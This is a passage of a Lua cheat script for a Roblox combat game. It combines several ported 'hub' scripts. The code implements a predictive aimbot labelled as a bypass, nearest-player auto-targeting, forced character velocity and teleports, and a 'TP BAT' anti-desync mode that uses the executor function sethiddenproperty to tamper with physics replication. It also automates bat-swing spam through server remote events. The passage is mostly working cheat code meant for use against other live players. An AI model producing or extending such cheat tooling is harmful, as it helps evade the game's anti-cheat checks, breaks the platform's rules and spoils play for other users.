                vVel = Vector3.new(0, math.sign(moveDir.Y) * CFG.VERT_SPEED, 0)
            else
                vVel = Vector3.new(0, -2, 0)
            end
            _intendedVel = hVel + vVel
            root.Velocity = _intendedVel
            if hDir.Magnitude > 0.5 then hum:Move(hDir.Unit, false) end
            if CFG.autoSwing and not swingCD then
                local bat = char:FindFirstChild("Bat")
                if bat and bat:IsA("Tool") then
                    swingCD = true
                    pcall(function()
                        bat:Activate()
                        local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
                        if ev then ev:FireServer() end
                    end)
                    task.delay(CFG.SWING_COOLDOWN, function() swingCD = false end)
                end
            end
        end))
        track(RunService.RenderStepped:Connect(function()
            if not aimEnabled or S.destroyed then return end
            local char = LP.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            local velocity = root.Velocity
            if math.abs(velocity.X) > 350 or math.abs(velocity.Z) > 350 then root.Velocity = _intendedVel end
            purgeHRP(root)
        end))
        track(LP.CharacterAdded:Connect(function(character)
            task.wait(0.5)
            if S.destroyed or LP.Character ~= character then return end
            batEquippedThisRun = false
            resetHistory()
            if aimEnabled then
                local root = character:FindFirstChild("HumanoidRootPart")
                if root then cleanAngVelc(); v7.lastRoot = root; purgeHRP(root); setupAngVelc(root) end
                if CFG.BatSpam then startBatSpam() end
            end
        end))
    end
    -- Final predictive V11 core from FR's "AIMBOT V11 BYPASS" switch.
    -- FR's global helper names are local to this factory, avoiding collisions
    -- with a separately running FR script or Pure's existing features.
    do
        local m, K, c = LP, Players, RunService
        local E = {Aimbot = false, ["Lagger Aimbot"] = false}
        local H = {}
        local autoplayActive = false
        local ci = function() end
        local _FRHUBV11StartFollowing, _FRHUBV11Stop
        local _G = {
            __FRHUB_V11_STATE = H,
            __FRHUBV11AutoDrop = function(fn) if fn then fn() end end,
            __FRHUBV11StopSpeedBoost = function() end,
            __FRHUBV11RefreshSpeedBoost = function() end,
            __FRHUBV11StopAutoplay = function() end,
            __FRHUBV11DeactivateOthers = function() v7.stop() end,
        }
        local function __FRHUBV11CombatSpeed() return v11CombatSpeed() end
        local function __v11Stopper(fn) v11.stopCore = fn end
        local i = m;
        local function o()
            local a = i.Character;
            if a then
                local Pi = a:FindFirstChildOfClass("Tool");
                if Pi then
                    local a = Pi.Name:lower();
                    if a:find("bat", 1, true) or(a:find("slap", 1, true)) then
                        return Pi;
                    end;
                end;
                Pi = i:FindFirstChildOfClass("Backpack");
                if Pi then
                    for i, a in ipairs(Pi:GetChildren()) do
                        if a:IsA("Tool") then
                            i = a.Name:lower();
                            if i:find("bat", 1, true) or(i:find("slap", 1, true)) then
                                return a;
                            end;
                        end;
                    end;
                end;
            end;
            return nil;
        end;
        local i, a, Pi = {targetPlayer = nil, lastTargetPos = nil, targetVelocity = Vector3.zero, smoothedVelocity = Vector3.zero, velocityHistory = {}, accelerationHistory = {}, aerialVelocityHistory = {}, verticalVelocityHistory = {}, previousDirection = nil, lastDirectionChangeTime = 0, airborneTime = 0, lastYVelocity = 0, lastJumpTime = 0, lastActivationTime = 0, currentPing = 0.1, realPingMs = 0}, {FOLLOW_SPEED = 55, ACTIVATE_DISTANCE = 13, MIN_FOLLOW_DISTANCE = 1, PREDICTION_TIME = 0.12, PREDICT_AHEAD = 1.5, MAX_VELOCITY_CHANGE = 150, VELOCITY_SMOOTHING = 0.2, MAX_HORIZONTAL_VELOCITY = 80, SERVER_TICKRATE = 0.016666666666666666, MIN_PING_COMPENSATION = 0.03, MAX_PING_COMPENSATION = 0.12, ACCELERATION_PREDICTION_WEIGHT = 0.3, DIRECTION_CHANGE_DETECTION_TIME = 0.12, QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5, GRAVITY = 196.2, AIR_CONTROL_FACTOR = 0.8, AERIAL_VELOCITY_DECAY = 0.95, MIN_AIRBORNE_TIME = 0.08, FALLING_SPEED_THRESHOLD =- 15};
        v11.state, v11.tuning = i, a
        local function ki(xi)
            if #xi == 0 then
                return Vector3.zero;
            end;
            local _i = Vector3.zero;
            for Li, Li in ipairs(xi) do
                _i += Li;
            end;
            return _i / #xi;
        end;
        local function xi(_i, Li, zi)
            table.insert(_i, Li);
            if #_i > zi then
                table.remove(_i, 1);
            end;
        end;
        local function _i ()
            i.targetPlayer = nil;
            i.lastTargetPos = nil;
            i.targetVelocity = Vector3.zero;
            i.smoothedVelocity = Vector3.zero;
            i.velocityHistory = {};
            i.accelerationHistory = {};
            i.aerialVelocityHistory = {};
            i.verticalVelocityHistory = {};
            i.previousDirection = nil;
            i.airborneTime = 0;
            i.lastYVelocity = 0;
        end;
        local function Li(zi)
            local Si, gi = math.huge;
            for Oi, ni in ipairs(K:GetPlayers()) do
                if ni ~= m and ni.Character then
                    local Ji, fi = ni.Character:FindFirstChild("HumanoidRootPart"), ni.Character:FindFirstChildOfClass("Humanoid");
                    if Ji and fi and fi.Health > 0 then
                        Oi = (zi.Position - Ji.Position).Magnitude;
                        if Oi < Si then
                            Si, gi = Oi, ni;
                        end;
                    end;
                end;
            end;
            return gi;
        end;
        local function zi(Si, gi)
            if gi.Magnitude < 0.01 then
                return;
            end;
            local Oi = Si.CFrame.LookVector:Cross(gi.Unit);
            gi = math.asin(math.clamp(Oi.Magnitude,- 1, 1));
            Si.AssemblyAngularVelocity = Oi.Magnitude > 0.01 and Oi.Unit * gi * 80 or Vector3.zero;
        end;
        local function Si()
            local gi, Oi = pcall(function() return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue(); end);
            if gi and type(Oi) == "number" then
                i.realPingMs = math.floor(Oi);
            end;
            i.currentPing = math.clamp(i.realPingMs / 1000, a.MIN_PING_COMPENSATION, a.MAX_PING_COMPENSATION);
        end;
        task.spawn(function() while _G.__FRHUB_V11_STATE == H do pcall(Si); task.wait(0.5); end; end);
        local function Si()
            if Pi then
                Pi:Disconnect();
                Pi = nil;
            end;
            local gi = m.Character;
            local Oi, ni = gi and(gi:FindFirstChildOfClass("Humanoid")), gi and(gi:FindFirstChild("HumanoidRootPart"));
            if Oi then
                Oi.AutoRotate = true;
            end;
            if ni then
                ni.AssemblyAngularVelocity = Vector3.zero;
            end;
            _i ();
            i.lastActivationTime = 0;
        end;
        local function gi(Oi)
            Oi = Oi or m.Character;
            local ni, Ji = Oi and(Oi:FindFirstChildOfClass("Humanoid")), Oi and(Oi:FindFirstChild("HumanoidRootPart"));
            if not ni or not Ji then
                return;
            end;
            Si();
            ni.AutoRotate = false;
            local fi = o();
            if fi and fi.Parent ~= Oi then
                pcall(ni.EquipTool, ni, fi);
            end;
            Pi = c.RenderStepped:Connect(function(Pi) if not E.Aimbot then Si(); return; end; local Oi = m.Character; local oi, qi = Oi and(Oi:FindFirstChild("HumanoidRootPart")), Oi and(Oi:FindFirstChildOfClass("Humanoid")); if not oi or not qi or qi.Health <= 0 then return; end; qi.AutoRotate = false; Ji, ni = oi, qi; v11.lastRoot = Ji; fi = Oi:FindFirstChildOfClass("Tool") or(o()); if fi and fi.Parent ~= Oi then pcall(qi.EquipTool, qi, fi); end; Oi = nil; if _G.__FRHUBV11MarkerCFrame then oi, qi = pcall(_G.__FRHUBV11MarkerCFrame); Oi = if oi then qi else Oi; end; if Oi then oi = Oi.Position - Ji.Position; if oi.Magnitude > 0.1 then zi(Ji, oi); end; if oi.Magnitude > a.MIN_FOLLOW_DISTANCE then qi = math.clamp(__FRHUBV11CombatSpeed(), 1, 120); local f11m = Vector3.new(oi.X, 0, oi.Z); local y11m = oi.Y * 19.5; if ni and ni.FloorMaterial ~= Enum.Material.Air then y11m = math.max(y11m, 13) end; y11m = math.clamp(y11m, -70, 110); if f11m.Magnitude > 0.01 then Ji.AssemblyLinearVelocity = Vector3.new(f11m.Unit.X * qi, y11m, f11m.Unit.Z * qi) else Ji.AssemblyLinearVelocity = Vector3.new(0, y11m, 0) end else Ji.AssemblyLinearVelocity = Vector3.zero; end; return; end; i.targetPlayer = Li(Ji); oi = i.targetPlayer and i.targetPlayer.Character; qi, Oi = oi and(oi:FindFirstChild("HumanoidRootPart")), oi and(oi:FindFirstChildOfClass("Humanoid")); if not qi or not Oi or Oi.Health <= 0 then _i (); Ji.AssemblyLinearVelocity = Vector3.zero; Ji.AssemblyAngularVelocity = Vector3.zero; return; end; local o, _i = qi.Position, math.max(Pi, 0.004166666666666667); if i.lastTargetPos then oi = (o - i.lastTargetPos) / _i; Pi = oi - i.targetVelocity; oi = if Pi.Magnitude > a.MAX_VELOCITY_CHANGE then i.targetVelocity + Pi.Unit * a.MAX_VELOCITY_CHANGE else oi; qi = Vector3.new(oi.X, 0, oi.Z); if qi.Magnitude > a.MAX_HORIZONTAL_VELOCITY then qi = qi.Unit * a.MAX_HORIZONTAL_VELOCITY; oi = (Vector3.new(qi.X, oi.Y, qi.Z)); end; xi(i.accelerationHistory, (oi - i.targetVelocity) / _i, 4); xi(i.velocityHistory, oi, 8); xi(i.verticalVelocityHistory, oi.Y, 5); i.targetVelocity = oi; i.smoothedVelocity = i.smoothedVelocity:Lerp(oi, a.VELOCITY_SMOOTHING); end; i.lastTargetPos = o; Pi = Oi.FloorMaterial == Enum.Material.Air; i.airborneTime = Pi and i.airborneTime + _i or 0; if Pi and i.airborneTime >= a.MIN_AIRBORNE_TIME then xi(i.aerialVelocityHistory, i.targetVelocity, 6); elseif not Pi then i.aerialVelocityHistory = {}; end; qi = i.smoothedVelocity; if Pi and #i.aerialVelocityHistory > 0 then Oi = ki(i.aerialVelocityHistory); qi = Vector3.new(Oi.X, i.targetVelocity.Y, Oi.Z) * a.AIR_CONTROL_FACTOR; end; _i, Oi = false, Vector3.new(i.targetVelocity.X, 0, i.targetVelocity.Z); if Oi.Magnitude > 5 then oi = Oi.Unit; if i.previousDirection and i.previousDirection:Dot(oi) < 0.5 then _i = tick() - i.lastDirectionChangeTime < a.DIRECTION_CHANGE_DETECTION_TIME; i.lastDirectionChangeTime = tick(); end; i.previousDirection = oi; end; oi = i.currentPing + a.SERVER_TICKRATE; local xi, Li = o + qi * (if _i then oi * a.QUICK_DIRECTION_CHANGE_MULTIPLIER else oi) + ki(i.accelerationHistory) * a.ACCELERATION_PREDICTION_WEIGHT * ((if _i then oi * a.QUICK_DIRECTION_CHANGE_MULTIPLIER else oi) * (if _i then oi * a.QUICK_DIRECTION_CHANGE_MULTIPLIER else oi) * 0.5), a.PREDICTION_TIME * 1.1; xi = if Pi then xi + qi * Li + Vector3.new(0,- 0.5 * a.GRAVITY * Li * Li, 0) else xi + qi * Li; local ld11 = xi - o; if ld11.Magnitude > 9 then xi = o + ld11.Unit * 9 end; Oi = Vector3.new(qi.X, 0, qi.Z); Pi = (if Oi.Magnitude > 1 then xi + Oi.Unit * a.PREDICT_AHEAD else xi) - Ji.Position; zi(Ji, Pi); if Ji.Position.Y < -5 and o.Y - Ji.Position.Y > 6 then if not i.underSince then i.underSince = tick() elseif tick() - i.underSince > 0.2 and tick() - (i.lastRelock or 0) > 0.25 then i.lastRelock = tick(); i.underSince = nil; local _, yaw11 = Ji.CFrame:ToEulerAnglesYXZ(); Ji.CFrame = CFrame.new(Ji.Position.X, o.Y + 3, Ji.Position.Z) * CFrame.Angles(0, yaw11, 0); Ji.AssemblyLinearVelocity = Vector3.zero end else i.underSince = nil end; if(o - Ji.Position).Magnitude <= a.ACTIVATE_DISTANCE and tick() - i.lastActivationTime >= 0.08 and autoSwingEnabled == true then if fi then pcall(fi.Activate, fi); pcall(function() local ev11 = fi:FindFirstChildWhichIsA("RemoteEvent"); if ev11 then ev11:FireServer() end end); end; i.lastActivationTime = tick(); end; if Pi.Magnitude > a.MIN_FOLLOW_DISTANCE then qi = math.clamp(__FRHUBV11CombatSpeed(), 1, 120); local f11 = Vector3.new(Pi.X, 0, Pi.Z); local h11 = 1.5; do local tc11 = i.targetPlayer and i.targetPlayer.Character; local hd11 = tc11 and tc11:FindFirstChild("Head"); if hd11 then h11 = math.clamp(hd11.Position.Y - o.Y, 0, 3) end end; local y11 = (Pi.Y + h11 + 3.7) * 19.5 + i.targetVelocity.Y * 0.8; if ni and ni.FloorMaterial ~= Enum.Material.Air then y11 = math.max(y11, 13) end; y11 = math.clamp(y11, -70, 110); if f11.Magnitude > 0.01 then Ji.AssemblyLinearVelocity = Vector3.new(f11.Unit.X * qi, y11, f11.Unit.Z * qi); else Ji.AssemblyLinearVelocity = Vector3.new(0, y11, 0) end; else Ji.AssemblyLinearVelocity = Vector3.new(0, Ji.AssemblyLinearVelocity.Y * 0.5, 0) end; end);
        end;
        _FRHUBV11StartFollowing = gi;
        _FRHUBV11Stop = Si;
        _G.FRHUBSetAimbotV11Core = function(i)
            if i then
                if _G.__FRHUBV11StopSpeedBoost then
                    _G.__FRHUBV11StopSpeedBoost ();
                end;
                if autoplayActive or E.Autoplay then
                    _G.__FRHUBV11StopAutoplay ();
                end;
                ci("Aimbot");
                if _G.__FRHUBV11DeactivateOthers then
                    _G.__FRHUBV11DeactivateOthers ("Aimbot");
                end;
                _G.__FRHUBV11AutoDrop (function() gi(m.Character); end);
            else
                Si();
                if _G.__FRHUBV11RefreshSpeedBoost then
                    _G.__FRHUBV11RefreshSpeedBoost ();
                end;
            end;
        end;
        __v11Stopper (Si);
        v11.enabled = function() return E.Aimbot == true end
        v11.clearVelocity = function()
            zeroRoot(v11.lastRoot)
            local char = LP.Character
            zeroRoot(char and char:FindFirstChild("HumanoidRootPart"))
        end
        v11.start = function()
            if S.destroyed or E.Aimbot then return end
            E.Aimbot = true
            _G.FRHUBSetAimbotV11Core(true)
        end
        v11.stop = function()
            local wasEnabled = E.Aimbot
            E.Aimbot, E["Lagger Aimbot"] = false, false
            if _G.FRHUBSetAimbotV11Core then _G.FRHUBSetAimbotV11Core(false) end
            if wasEnabled then v11.clearVelocity() end
            v11.lastRoot = nil
        end
        v11.dispose = function()
            v11.stop()
            _G.__FRHUB_V11_STATE = nil -- terminate this instance's ping sampler.
        end
        track(LP.CharacterAdded:Connect(function(character)
            task.wait(0.5)
            if not S.destroyed and E.Aimbot and LP.Character == character then
                _FRHUBV11StartFollowing(character)
            end
        end))
    end
    local function clearAimVelocity()
        if v7.clearVelocity then v7.clearVelocity() end
        if v11.clearVelocity then v11.clearVelocity() end
        local character = LP.Character
        zeroRoot(character and character:FindFirstChild("HumanoidRootPart"))
    end
    local function stopEngines()
        v7.stop()
        v11.stop()
        S.activeMode = nil
        clearAimVelocity()
    end
    local function getActiveTarget()
        if S.destroyed or not S.activeMode then return nil end
        local target
        if S.activeMode == "normal" and v7.enabled() then target = v7.target
        elseif S.activeMode == "bypass" and v11.enabled() then
            local player = v11.state and v11.state.targetPlayer
            target = player and player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        end
        local character = target and target.Parent
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if target and humanoid and humanoid.Health > 0 then return target end
        return nil
    end
    local function setAutoBatState(enabled)
        if S.destroyed then return false end
        enabled = enabled == true
        local mode = batAimMode == "bypass" and "bypass" or "normal"
        local engine = mode == "bypass" and v11 or v7
        if enabled and S.activeMode == mode and engine.enabled() then return true end
        -- Always stop BOTH engines: the selected mode may already have changed
        -- before the existing UI calls stopAimbotFull().
        stopEngines()
        if enabled then
            if _G.HorizonStealModes then _G.HorizonStealModes.Suspend() end
            if __HH.stopBodyLock then __HH.stopBodyLock() end
            S.activeMode = mode
            engine.start()
            return engine.enabled()
        end
        if _G.HorizonStealModes then _G.HorizonStealModes.Resume() end
        if __HH.bodyLockEnabled and __HH.startBodyLock then
            task.delay(0.2, function()
                if not S.destroyed and not S.activeMode and __HH.bodyLockEnabled then __HH.startBodyLock() end
            end)
        end
        return false
    end
    S.SetEnabled = setAutoBatState
    S.IsEnabled = function()
        if S.destroyed then return false end
        return (S.activeMode == "normal" and v7.enabled()) or (S.activeMode == "bypass" and v11.enabled()) or false
    end
    S.GetActiveMode = function() return S.activeMode end
    S.GetTarget = getActiveTarget
    S.ClearVelocity = clearAimVelocity
    S.normal, S.bypass = v7, v11
    S.Destroy = function()
        if S.destroyed then return end
        stopEngines()
        S.destroyed = true
        if v11.dispose then v11.dispose() end
        for _, connection in ipairs(S.connections) do pcall(function() connection:Disconnect() end) end
        S.connections = {}
        if ownedMirror and ownedMirror.Destroy then ownedMirror.Destroy() end
    end
    _G.PureAimbotPort = S
    -- Keep the interfaces already used by carry/drop, Safe Mode, TP DOWN,
    -- keyboard/controller keybinds and the mobile AIM BOT button.
    _G.PureCursedSetAimbot = setAutoBatState
    _G.PureCursedGetAimbot = S.IsEnabled
    _G.PureCursedClearAimVelocity = clearAimVelocity

    -- MIRROR TP DOWN (ported from FR HUB and adapted to Pure's AIM BOT).
    -- It watches the selected FR engine's current target and mirrors any sudden 3-stud
    -- downward move by placing the local root at Pure's TP DOWN level.
    do
        local MIRROR_TP_DROP_THRESHOLD = 3
        local MIRROR_TP_DOWN_Y = -7.00
        local mirrorEnabled = false
        local mirrorTrackedRoot = nil
        local mirrorPreviousY = nil
        local mirrorLastTeleport = 0
        local mirrorHeartbeat = nil
        local mirrorCharacterConn = nil

        local function clearMirrorTracking()
            mirrorTrackedRoot = nil
            mirrorPreviousY = nil
        end

        local function getPureAimTarget()
            return getActiveTarget()
        end

        local function mirrorTeleportDown()
            local character = LP.Character
            local root = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            if not root or not humanoid or humanoid.Health <= 0 then return end

            local now = tick()
            if now - mirrorLastTeleport < 0.08 then return end
            mirrorLastTeleport = now

            local _, yaw = root.CFrame:ToEulerAnglesYXZ()
            root.CFrame = CFrame.new(root.Position.X, MIRROR_TP_DOWN_Y, root.Position.Z)
                * CFrame.Angles(0, yaw, 0)

            -- Clear both imported engines' owned movement for this TP DOWN step.
            clearAimVelocity()
            root.AssemblyAngularVelocity = Vector3.zero
        end

        local function setMirrorEnabled(on)
            mirrorEnabled = on == true
            if not mirrorEnabled then clearMirrorTracking() end
            if _G.PureMirrorTPDownSetVisual then
                pcall(_G.PureMirrorTPDownSetVisual, mirrorEnabled)
            end
            return mirrorEnabled
        end

        pcall(function()
            if _G.PureMirrorTPDown and _G.PureMirrorTPDown.Destroy then
                _G.PureMirrorTPDown.Destroy()
            end
        end)

        mirrorHeartbeat = RunService.Heartbeat:Connect(function()
            if not mirrorEnabled then
                clearMirrorTracking()
                return
            end

            local target = getPureAimTarget()
            if not target then
                clearMirrorTracking()
                return
            end

            local currentY = target.Position.Y
            if target ~= mirrorTrackedRoot then
                mirrorTrackedRoot = target
                mirrorPreviousY = currentY
                return
            end

            local previousY = mirrorPreviousY
            mirrorPreviousY = currentY
            if previousY and previousY - currentY >= MIRROR_TP_DROP_THRESHOLD then
                mirrorTeleportDown()
                mirrorPreviousY = target.Parent and target.Position.Y or nil
            end
        end)

        mirrorCharacterConn = LP.CharacterAdded:Connect(clearMirrorTracking)

        _G.PureMirrorTPDown = {
            enabled = function() return mirrorEnabled end,
            setEnabled = setMirrorEnabled,
            getTarget = getPureAimTarget,
            Destroy = function()
                mirrorEnabled = false
                clearMirrorTracking()
                if mirrorHeartbeat then mirrorHeartbeat:Disconnect(); mirrorHeartbeat = nil end
                if mirrorCharacterConn then mirrorCharacterConn:Disconnect(); mirrorCharacterConn = nil end
            end,
        }
    end


    ownedMirror = _G.PureMirrorTPDown

    function toggleBatV2()
        local turningOn = not __HH.batV2Enabled
        _G.PureDropThenAimSafeModeAuthorized = false
        __HH.batV2Enabled = turningOn
        setAutoBatState(turningOn)
        if __HH.batV2SetVisual then __HH.batV2SetVisual(turningOn) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(turningOn) end
        return turningOn
    end
    function stopAimbotFull()
        __HH.batV2Enabled = false
        setAutoBatState(false)
        if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(false) end
    end
    function queueAutoBatStart()
        __HH.batV2Enabled = true
        setAutoBatState(true)
    end
    function stopBatAimbot()
        setAutoBatState(false)
    end

    -- TP BAT (Clean source / AntiDesync implementation)
    _G.AceAntiDesync = _G.AceAntiDesync or {conn=nil,hittingCooldown=false,h=nil,hrp=nil}
    _G.AceAntiDesyncAimbotOn = false
    antiDesyncAutoSwingEnabled = true

    local CLEAN_BAT_NAMES = {
        "Bat","Slap","Iron Slap","Gold Slap","Diamond Slap",
        "Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap",
        "Nuclear Slap","Galaxy Slap","Glitched Slap"
    }

    local function getBatAntiDesync()
        local char=LP.Character
        if not char then return nil end
        for _,name in ipairs(CLEAN_BAT_NAMES) do
            local tool=char:FindFirstChild(name)
            if tool and tool:IsA("Tool") then return tool end
        end
        local bp=LP:FindFirstChild("Backpack")
        if bp then
            for _,name in ipairs(CLEAN_BAT_NAMES) do
                local tool=bp:FindFirstChild(name)
                if tool and tool:IsA("Tool") then
                    local hum=char:FindFirstChildOfClass("Humanoid")
                    if hum then pcall(function() hum:EquipTool(tool) end) end
                    return tool
                end
            end
        end
        for _,child in ipairs(char:GetChildren()) do
            if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
                return child
            end
        end
    end

    local function trySwingAntiDesync()
        local st=_G.AceAntiDesync
        if st.hittingCooldown then return end
        st.hittingCooldown=true
        pcall(function()
            local bat=getBatAntiDesync()
            if bat then
                if bat.Parent~=LP.Character then
                    local hum=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                    if hum then pcall(function() hum:EquipTool(bat) end) end
                end
                bat:Activate()
                local ev=bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then pcall(function() ev:FireServer() end) end
            end
        end)
        task.delay(0.01,function()
            if _G.AceAntiDesync then _G.AceAntiDesync.hittingCooldown=false end
        end)
    end

    local function getClosestPlayerAntiDesync()
        local hrp=_G.AceAntiDesync and _G.AceAntiDesync.hrp
        if not hrp then return nil,math.huge end
        local closest,bestDist=nil,math.huge
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr~=LP and plr.Character then
                local tr=plr.Character:FindFirstChild("HumanoidRootPart")
                local ph=plr.Character:FindFirstChildOfClass("Humanoid")
                if tr and ph and ph.Health>0 then
                    local d=(hrp.Position-tr.Position).Magnitude
                    if d<bestDist then bestDist=d;closest=plr end
                end
            end
        end
        return closest,bestDist
    end

    local function setupCharAntiDesync(char)
        task.wait(0.1)
        if not _G.AceAntiDesync then return end
        _G.AceAntiDesync.h=char and char:FindFirstChildOfClass("Humanoid") or nil
        _G.AceAntiDesync.hrp=char and char:FindFirstChild("HumanoidRootPart") or nil
    end

    function startAntiDesyncAimbot()
        if _G.AceSafeModeTryStart and not _G.AceSafeModeTryStart() then return false end
        if _G.AceStopAutoTPForAction then _G.AceStopAutoTPForAction() end
        if autoBatEnabled and disableAutoBat then pcall(disableAutoBat) end
        if __HH.batV2Enabled and toggleBatV2 then pcall(toggleBatV2) end
        if autoLeftEnabled and stopAutoLeft then autoLeftEnabled=false;stopAutoLeft() end
        if autoRightEnabled and stopAutoRight then autoRightEnabled=false;stopAutoRight() end
        _G.AceAntiDesyncAimbotOn=true
        if _G.AceAntiDesync.conn then _G.AceAntiDesync.conn:Disconnect();_G.AceAntiDesync.conn=nil end
        if LP.Character then task.spawn(function() setupCharAntiDesync(LP.Character) end) end
        _G.AceAntiDesync.conn=RunService.Heartbeat:Connect(function()
            local st=_G.AceAntiDesync
            if not (_G.AceAntiDesyncAimbotOn and st.h and st.hrp) then return end
            local target=getClosestPlayerAntiDesync()
            if target and target.Character then
                local tr=target.Character:FindFirstChild("HumanoidRootPart")
                if tr then
                    if sethiddenproperty then pcall(function() sethiddenproperty(st.hrp,"PhysicsRepRootPart",tr) end) end
                    local targetPos=tr.Position+Vector3.new(0,0.9,0)
                    if (st.hrp.Position-targetPos).Magnitude>8 then st.hrp.CFrame=CFrame.new(targetPos) end
                    local cam=workspace.CurrentCamera
                    if cam then cam.CFrame=CFrame.new(cam.CFrame.Position,tr.Position) end
                    if antiDesyncAutoSwingEnabled then trySwingAntiDesync() end
                end
            end
        end)
        if __HH.tpLockSetVisual then __HH.tpLockSetVisual(true) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.tpLock then __HH.mobBtnRefs.tpLock(true) end
        return true
    end

    function stopAntiDesyncAimbot()
        _G.AceAntiDesyncAimbotOn=false
        if _G.AceAntiDesync and _G.AceAntiDesync.conn then
            _G.AceAntiDesync.conn:Disconnect();_G.AceAntiDesync.conn=nil
        end
        if _G.AceAntiDesync then _G.AceAntiDesync.hittingCooldown=false end
        if sethiddenproperty and _G.AceAntiDesync and _G.AceAntiDesync.hrp then
            pcall(function() sethiddenproperty(_G.AceAntiDesync.hrp,"PhysicsRepRootPart",nil) end)
        end
        local cam=workspace.CurrentCamera
        if cam and LP.Character then
            local hrp=LP.Character:FindFirstChild("HumanoidRootPart")
            if hrp then cam.CFrame=CFrame.new(cam.CFrame.Position,hrp.Position) end
        end
        if __HH.tpLockSetVisual then __HH.tpLockSetVisual(false) end
        if __HH.mobBtnRefs and __HH.mobBtnRefs.tpLock then __HH.mobBtnRefs.tpLock(false) end
    end

    function toggleAntiDesyncAimbot()
        if _G.AceAntiDesyncAimbotOn then stopAntiDesyncAimbot() else startAntiDesyncAimbot() end
        return _G.AceAntiDesyncAimbotOn
    end

    startTPLock=startAntiDesyncAimbot
    stopTPLock=stopAntiDesyncAimbot
    toggleTPLock=toggleAntiDesyncAimbot
    LP.CharacterAdded:Connect(function(char)
        task.spawn(function() setupCharAntiDesync(char) end)
        if _G.AceAntiDesyncAimbotOn then
            task.wait(0.5)
            if not _G.AceAntiDesync.conn then startAntiDesyncAimbot() end
        end
    end)
    if LP.Character then task.spawn(function() setupCharAntiDesync(LP.Character) end) end
    _G.AceAntiDesyncStart=startAntiDesyncAimbot
    _G.AceAntiDesyncStop=stopAntiDesyncAimbot
    _G.AceAntiDesyncToggle=toggleAntiDesyncAimbot

    _G.PureTPBatV4Start = startAntiDesyncAimbot
    _G.PureTPBatV4Stop = stopAntiDesyncAimbot
    _G.PureTPBatV4Toggle = toggleAntiDesyncAimbot

end


-- BAT SPAM (ported from FR HUB).
-- Uses FR's activation loop, close-range double swing and watchdog behavior.
do
    local S = {enabled=false, thread=nil, delay=50, watchdog=nil}

    local function getEquippedBat()
        local character = LP.Character
        if not character then return nil end
        local bat = character:FindFirstChild("bat") or character:FindFirstChild("Bat")
        if bat and bat:IsA("Tool") and bat.Parent == character then return bat end
        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") then
                local name = tool.Name:lower()
                if name:find("bat") or name:find("slap") then return tool end
            end
        end
        return nil
    end

    local function getNearestDistance(root)
        local nearest = math.huge
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP and player.Character then
                local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
                local targetHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
                if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
                    local distance = (targetRoot.Position - root.Position).Magnitude
                    if distance < nearest then nearest = distance end
                end
            end
        end
        return nearest
    end

    local function runSpamLoop()
        if S.thread then return end
        S.thread = task.spawn(function()
            while S.enabled do
                pcall(function()
                    local character = LP.Character
                    local bat = getEquippedBat()
                    if character and bat then
                        bat:Activate()
                        local root = character:FindFirstChild("HumanoidRootPart")
                        if root and getNearestDistance(root) < 6 then
                            task.wait(0.02)
                            if bat.Parent == character then bat:Activate() end
                        end
                    end
                end)
                task.wait(S.delay / 1000)
            end
            S.thread = nil
        end)
    end

    local function startBatSpam()
        S.enabled = true
        runSpamLoop()
        if not S.watchdog then
            S.watchdog = task.spawn(function()
                while S.enabled do
                    task.wait(0.6)
                    if S.enabled and not S.thread then runSpamLoop() end
                end
                S.watchdog = nil
            end)
        end
    end

    local function stopBatSpam()
        S.enabled = false
        if S.thread then pcall(task.cancel, S.thread); S.thread = nil end
        if S.watchdog then pcall(task.cancel, S.watchdog); S.watchdog = nil end
    end

    local function setBatSpamEnabled(on)
        if on == true then startBatSpam() else stopBatSpam() end
        if _G.PureBatSpamSetVisual then pcall(_G.PureBatSpamSetVisual, S.enabled) end
        return S.enabled
    end

    pcall(function()
        if _G.PureBatSpam and _G.PureBatSpam.Destroy then _G.PureBatSpam.Destroy() end
    end)

    _G.PureBatSpam = {
        enabled = function() return S.enabled end,
        setEnabled = setBatSpamEnabled,
        Destroy = function() stopBatSpam() end,
    }
end

__HH.guiTransparencyEnabled = false
__HH.selectedDevice = nil -- "PC" | "MOBILE" | "CONTROLLER" (set by the device picker / Reset Device)
__HH.mobileButtonsEnabled = true
__HH.mobileButtonsSize = 80
__HH.circleButtonsEnabled = false
__HH.shapeButtonsEnabled = false
__HH.rectangularButtonsEnabled = false
__HH.mobBtnRefs = {}
local apExtSetLeft  = nil   -- visual updater for external LEFT btn
local apExtSetRight = nil   -- visual updater for external RIGHT btn
-- Mobile tab: per-button visibility (true = show, false = hidden)
__HH.buttonVisibility = {
    drop=true, tpDown=true, batV1=true, batV2=true, tpLock=true,
    lagger=true, laggerCarry=true, carrySpeed=true,
    instaReset=true,
}
-- Auto drop + aimbot when TP BAT / BAT V2 enabled while carrying (always on)
local function refreshAPExtBtns()
    local COL_ON  = Color3.fromRGB(149, 216, 255)
    local COL_OFF = Color3.fromRGB(26, 46, 64)
    if apExtSetLeft  then apExtSetLeft (autoLeftEnabled and COL_ON or COL_OFF) end
    if apExtSetRight then apExtSetRight(autoRightEnabled and COL_ON or COL_OFF) end
end
__HH.mobGuiRef = nil
__HH.infJumpMode = "manual"
__HH.holdInfJumpConn = nil
__HH.uiLocked = false
__HH.perButtonDragEnabled = true

